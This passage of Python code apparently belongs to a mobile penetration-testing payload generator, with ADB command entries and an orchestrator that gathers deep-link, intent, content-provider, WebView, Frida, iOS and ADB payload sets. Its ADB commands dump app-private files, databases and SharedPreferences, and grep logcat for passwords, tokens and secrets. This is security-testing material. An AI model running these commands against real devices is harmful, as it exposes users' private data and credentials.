                description="Extract app data via adb backup (if allowBackup=true)",
                adb_command=f"adb backup -f backup.ab -noapk {package}",
                expected_behavior="Creates backup containing SharedPrefs, databases, files",
                tags=["adb", "backup"],
            ),
            MobilePayload(
                name="run_as_shell",
                category=PayloadCategory.ADB,
                severity=PayloadSeverity.HIGH,
                payload="run_as",
                description="Access app sandbox via run-as (if debuggable)",
                adb_command=f"adb shell run-as {package} ls -la /data/data/{package}/",
                expected_behavior="Lists app private directory contents",
                tags=["adb", "run-as", "debuggable"],
            ),
            MobilePayload(
                name="shared_prefs_dump",
                category=PayloadCategory.ADB,
                severity=PayloadSeverity.MEDIUM,
                payload="prefs_dump",
                description="Dump SharedPreferences XML files",
                adb_command=f"adb shell run-as {package} cat shared_prefs/*.xml",
                tags=["adb", "shared-prefs"],
            ),
            MobilePayload(
                name="database_dump",
                category=PayloadCategory.ADB,
                severity=PayloadSeverity.HIGH,
                payload="db_dump",
                description="Extract SQLite databases",
                adb_command=f"adb shell run-as {package} cp databases/*.db /sdcard/",
                tags=["adb", "database"],
            ),
            MobilePayload(
                name="logcat_sensitive",
                category=PayloadCategory.ADB,
                severity=PayloadSeverity.MEDIUM,
                payload="logcat_grep",
                description="Search logcat for sensitive data",
                adb_command=f"adb logcat -d | grep -iE 'password|token|key|secret|auth|session' | grep {package}",
                tags=["adb", "logcat"],
            ),
        ]

    @staticmethod
    def input_injection_payloads() -> List[MobilePayload]:
        """Input injection via ADB."""
        return [
            MobilePayload(
                name="input_text",
                category=PayloadCategory.ADB,
                severity=PayloadSeverity.LOW,
                payload="adb_input",
                description="Inject text input via ADB",
                adb_command="adb shell input text 'injected_text'",
                tags=["adb", "input"],
            ),
            MobilePayload(
                name="input_tap",
                category=PayloadCategory.ADB,
                severity=PayloadSeverity.LOW,
                payload="adb_tap",
                description="Simulate screen tap via ADB",
                adb_command="adb shell input tap 500 500",
                tags=["adb", "input", "tap"],
            ),
        ]


# ════════════════════════════════════════════════════════════════════════════
# PAYLOAD GENERATOR — MAIN ORCHESTRATOR
# ════════════════════════════════════════════════════════════════════════════


class SirenPayloadGenerator:
    """Master payload generator for mobile security testing.

    Generates comprehensive attack payloads targeting:
    - Deep links, custom URL schemes
    - Content providers (SQLi, path traversal)
    - WebView (XSS, file://, JS interface)
    - Intents (activity hijack, service abuse)
    - Broadcasts (spoofing, injection)
    - Frida scripts (bypass, extraction, tracing)
    - Network (proxy, MITM, DNS)
    - iOS-specific (URL schemes, pasteboard, keychain)
    - ADB (backup, run-as, logcat)
    """

    VERSION = "1.0.0"

    def __init__(
        self,
        package_name: str = "",
        custom_schemes: Optional[List[str]] = None,
        content_authorities: Optional[List[str]] = None,
        js_interfaces: Optional[List[str]] = None,
    ) -> None:
        self.package = package_name
        self.schemes = custom_schemes or []
        self.authorities = content_authorities or []
        self.js_interfaces = js_interfaces or []

    def generate_all(self) -> Dict[str, PayloadSet]:
        """Generate all payload categories."""
        result: Dict[str, PayloadSet] = {}

        # Deep link payloads
        for scheme in self.schemes:
            dl_set = PayloadSet(
                name=f"deeplink_{scheme}",
                description=f"Deep link payloads for {scheme}://",
                category=PayloadCategory.DEEPLINK,
            )
            dl_set.payloads.extend(DeepLinkPayloads.xss_payloads(scheme))
            dl_set.payloads.extend(DeepLinkPayloads.redirect_payloads(scheme))
            dl_set.payloads.extend(DeepLinkPayloads.path_traversal_payloads(scheme))
            dl_set.payloads.extend(DeepLinkPayloads.command_injection_payloads(scheme))
            result[f"deeplink_{scheme}"] = dl_set

        # Intent scheme payloads
        if self.package:
            intent_set = PayloadSet(
                name="intents",
                description="Intent-based payloads",
                category=PayloadCategory.INTENT,
            )
            intent_set.payloads.extend(
                DeepLinkPayloads.intent_scheme_payloads(self.package)
            )
            intent_set.payloads.extend(
                IntentPayloads.activity_hijack_payloads(self.package)
            )
            intent_set.payloads.extend(
                IntentPayloads.service_exploit_payloads(self.package)
            )
            intent_set.payloads.extend(IntentPayloads.pending_intent_payloads())
            result["intents"] = intent_set

        # Content provider payloads
        for authority in self.authorities:
            cp_set = PayloadSet(
                name=f"content_provider_{authority}",
                description=f"Content provider payloads for {authority}",
                category=PayloadCategory.CONTENT_PROVIDER,
            )
            cp_set.payloads.extend(
                ContentProviderPayloads.sql_injection_payloads(authority)
            )
            cp_set.payloads.extend(
                ContentProviderPayloads.path_traversal_payloads(authority)
            )
            result[f"cp_{authority}"] = cp_set

        # WebView payloads
        wv_set = PayloadSet(
            name="webview",
            description="WebView exploitation payloads",
            category=PayloadCategory.WEBVIEW,
        )
        for iface in self.js_interfaces or ["Android"]:
            wv_set.payloads.extend(WebViewPayloads.js_interface_payloads(iface))
        wv_set.payloads.extend(WebViewPayloads.file_scheme_payloads())
        wv_set.payloads.extend(WebViewPayloads.universal_xss_payloads())
        result["webview"] = wv_set

        # Broadcast payloads
        if self.package:
            bc_set = PayloadSet(
                name="broadcasts",
                description="Broadcast exploitation payloads",
                category=PayloadCategory.BROADCAST,
            )
            bc_set.payloads.extend(BroadcastPayloads.spoofing_payloads(self.package))
            bc_set.payloads.extend(
                BroadcastPayloads.data_injection_payloads(self.package)
            )
            result["broadcasts"] = bc_set

        # Frida payloads
        frida_set = PayloadSet(
            name="frida",
            description="Frida runtime exploitation scripts",
            category=PayloadCategory.FRIDA,
        )
        frida_set.payloads.append(FridaPayloads.keystore_extraction())
        frida_set.payloads.append(FridaPayloads.token_theft())
        if self.package:
            frida_set.payloads.append(FridaPayloads.class_enumeration(self.package))
        result["frida"] = frida_set

        # Network payloads
        net_set = PayloadSet(
            name="network",
            description="Network interception payloads",
            category=PayloadCategory.NETWORK,
        )
        net_set.payloads.extend(NetworkPayloads.proxy_payloads())
        net_set.payloads.extend(NetworkPayloads.dns_payloads())
        result["network"] = net_set

        # iOS payloads
        ios_set = PayloadSet(
            name="ios",
            description="iOS-specific payloads",
            category=PayloadCategory.IOS_SPECIFIC,
        )
        for scheme in self.schemes:
            ios_set.payloads.extend(iOSPayloads.url_scheme_payloads(scheme))
        ios_set.payloads.extend(iOSPayloads.pasteboard_payloads())
        ios_set.payloads.extend(iOSPayloads.keychain_payloads())
        result["ios"] = ios_set

        # ADB payloads
        if self.package:
            adb_set = PayloadSet(
                name="adb",
                description="ADB-based exploitation payloads",
                category=PayloadCategory.ADB,
            )
            adb_set.payloads.extend(ADBPayloads.data_extraction_payloads(self.package))
            adb_set.payloads.extend(ADBPayloads.input_injection_payloads())
            result["adb"] = adb_set

        return result

    def get_critical_payloads(self) -> List[MobilePayload]:
        """Get only CRITICAL severity payloads."""
        all_sets = self.generate_all()
        critical: List[MobilePayload] = []
        for pset in all_sets.values():
            for p in pset.payloads:
                if p.severity == PayloadSeverity.CRITICAL:
                    critical.append(p)
        return critical

    def get_by_category(self, category: PayloadCategory) -> List[MobilePayload]:
        """Get payloads by category."""
        all_sets = self.generate_all()
        payloads: List[MobilePayload] = []
        for pset in all_sets.values():
            if pset.category == category:
                payloads.extend(pset.payloads)
        return payloads

    def get_adb_commands(self) -> List[str]:
        """Get all ADB commands from payloads."""
        all_sets = self.generate_all()
        commands: List[str] = []
        for pset in all_sets.values():
            for p in pset.payloads:
                if p.adb_command:
                    commands.append(p.adb_command)
        return commands

    def get_frida_scripts(self) -> List[Tuple[str, str]]:
        """Get all Frida scripts as (name, script) tuples."""
        all_sets = self.generate_all()
        scripts: List[Tuple[str, str]] = []
        for pset in all_sets.values():
            for p in pset.payloads:
                if p.frida_script:
                    scripts.append((p.name, p.frida_script))
        return scripts

    def summary(self) -> Dict[str, Any]:
        """Get payload generation summary."""
        all_sets = self.generate_all()
        total = sum(len(ps.payloads) for ps in all_sets.values())

        by_severity: Dict[str, int] = {}
        by_category: Dict[str, int] = {}

        for pset in all_sets.values():
            cat = pset.category.value
            by_category[cat] = by_category.get(cat, 0) + len(pset.payloads)
            for p in pset.payloads:
                sev = p.severity.value
                by_severity[sev] = by_severity.get(sev, 0) + 1

        return {
            "total_payloads": total,
            "categories": len(all_sets),
            "by_severity": by_severity,
            "by_category": by_category,
            "package": self.package,
            "schemes": self.schemes,
            "authorities": self.authorities,
        }
